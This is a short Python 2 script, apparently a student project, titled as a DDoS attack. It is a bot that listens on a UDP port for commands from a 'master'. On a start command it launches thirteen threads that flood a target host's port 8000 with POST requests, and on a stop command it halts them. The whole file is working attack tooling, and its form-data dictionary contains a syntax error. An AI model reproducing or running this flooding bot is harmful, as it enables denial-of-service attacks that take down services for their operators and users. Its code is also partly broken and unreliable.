#DDoS Attack
#Created by DDoS group from UnB

#Bibliotecas
from socket import *
import requests
from threading import Thread

#Variavel global que ira controlar a execucao
global Kill
#Variavel para parar o ataque
Kill = False

#Funcao ataque
def Post(url,attackedServerPort):
    parameters = {'nome':'Fuluno':'cpf': '12345678910':'Data':'29/06/2017':'Local:':'Brasilia'}
    headers = {'keep_alive': 'True'}
    while not Kill:
        r = requests.post(url, data=parameters, headers=headers)
        print r.text

    

#Funcao que ira criar as Threas 
def attack(IP, attackedServerPort):

    #Definicao das 5 threads 
    channel1 = Thread(target= Post, args= [IP, attackedServerPort])
    channel2 = Thread(target= Post, args= [IP, attackedServerPort])
    channel3 = Thread(target= Post, args= [IP, attackedServerPort])
    channel4 = Thread(target= Post, args= [IP, attackedServerPort])
    channel5 = Thread(target= Post, args= [IP, attackedServerPort])
    channel6 = Thread(target= Post, args= [IP, attackedServerPort])
    channel7 = Thread(target= Post, args= [IP, attackedServerPort])
    channel8 = Thread(target= Post, args= [IP, attackedServerPort])
    channel9 = Thread(target= Post, args= [IP, attackedServerPort])
    channel10 = Thread(target= Post, args= [IP, attackedServerPort])
    channel11 = Thread(target= Post, args= [IP, attackedServerPort])
    channel12 = Thread(target= Post, args= [IP, attackedServerPort])
    channel13 = Thread(target= Post, args= [IP, attackedServerPort])

    #seta as threads como daemon = true para que elas possam ser destruidas
    channel1.setDaemon(True)
    channel2.setDaemon(True)
    channel3.setDaemon(True)
    channel4.setDaemon(True)
    channel5.setDaemon(True)
    channel6.setDaemon(True)
    channel7.setDaemon(True)
    channel8.setDaemon(True)
    channel9.setDaemon(True)
    channel10.setDaemon(True)
    channel11.setDaemon(True)
    channel12.setDaemon(True)
    channel13.setDaemon(True)
    
    #Inicia as threads
    channel1.start()
    channel2.start()
    channel3.start()
    channel4.start()
    channel5.start()
    channel6.start()
    channel7.start()
    channel8.start()
    channel9.start()
    channel10.start()
    channel11.start()
    channel12.start()
    channel13.start()

#Funcao que escuta o controle central
def listening():

    sentence = ''

    #Porta que ira atacar
    attackedServerPort = 8000

    #Porta do servidor
    serverPort = 12000

    #Criando socket
    serverSocket = socket(AF_INET, SOCK_DGRAM)

    hostName = gethostbyname('0.0.0.0')

    #Junta porta com o nome do host
    serverSocket.bind((hostName, serverPort))

    print 'Waiting for my master...'

    #Ira analisar a variavel global
    global Kill

    while 1:
        while not sentence:
            sentence, addr = serverSocket.recvfrom(1024)

        command = sentence.split('/')[0]
        IP = sentence.split('/')[1]

        IP = 'http://' + IP + ':' + str(attackedServerPort)

        attackThread = Thread(target=attack, args=[IP, attackedServerPort])
        attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
        sentence = ''
        if(command == 'S'):
            print 'Starting attack'
            Kill = False
            attackThread.start()
        elif command == 'B':
            print 'Attack is over'
            Kill = True
        

    #Fecha socket    
    serverSocket.close()


if __name__ == "__main__":

    listeningThread = Thread(target= listening)
    listeningThread.start()